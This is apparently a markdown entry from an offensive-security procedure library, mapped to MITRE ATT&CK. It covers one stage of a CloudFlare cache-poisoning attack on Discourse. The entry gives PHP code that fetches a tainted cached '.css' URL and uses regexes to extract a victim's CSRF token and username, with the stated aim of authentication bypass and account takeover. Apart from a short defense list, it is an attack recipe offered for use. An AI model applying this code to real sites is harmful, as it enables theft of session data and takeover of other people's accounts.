---
tags:
  - data-extraction
  - csrf-leak
type: procedure
tools:
  - '[[tools/CloudFlare]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/php-file-get-contents-cached-page]]'
  - '[[commands/php-preg-match-csrf-token]]'
  - '[[commands/php-preg-match-username]]'
platforms:
  - Web
techniques:
  - '[[Steal Web Session Cookie]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 9be5d08c-c439-42a4-abdc-5521c837332b
created_at: '2025-12-13T09:00:34.485Z'
updated_at: '2025-12-13T09:00:34.485Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---
# Fetch Cached Data Server-Side

## Summary

This procedure uses a server-side PHP script to fetch the tainted CloudFlare cache and extract the victim's CSRF token and username via regex matching.

## Description

After the cache is tainted, the attacker fetches the content using file_get_contents and parses the HTML and headers to obtain sensitive data, enabling further exploitation like account takeover.

## Requirements

1. PHP environment for server-side fetching
2. Access to same CloudFlare region
3. Tainted cache from previous step

## Defense

Defensive measures and detection strategies:

- Implement strict cache controls on dynamic content
- Log and alert on server-side fetches from unusual IPs

## Objectives

1. Retrieve cached sensitive data
2. Extract CSRF token and username
3. Prepare for authentication bypass

## Instructions

### Step 1: Fetch Cached Page

**Context**: Retrieve the cached .css page content.

**Command** ([[commands/php-file-get-contents-cached-page]]):
```php
$data = file_get_contents($discourse.'/u/'.$f.'.css', false, $ctx);
```

> Fetches HTML including csrf-token and headers.

### Step 2: Extract CSRF Token

**Context**: Parse CSRF from HTML.

**Command** ([[commands/php-preg-match-csrf-token]]):
```php
preg_match('/name="csrf-token" content="([a-zA-Z0-9\/=+]+)"/',$data,$matches);
```

> Matches and stores CSRF token.

### Step 3: Extract Username

**Context**: Parse username from headers.

**Command** ([[commands/php-preg-match-username]]):
```php
preg_match('/X-Discourse-Username: (.*)/', implode("\n", $http_response_header), $name_matches);
```

> Matches and stores username.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Steal Web Session Cookie]]

### Sub-Techniques



## Commands Used

- [[commands/php-file-get-contents-cached-page]]
- [[commands/php-preg-match-csrf-token]]
- [[commands/php-preg-match-username]]

## Tools Used

- [[tools/CloudFlare]]

## Tags

- data-extraction
- csrf-leak
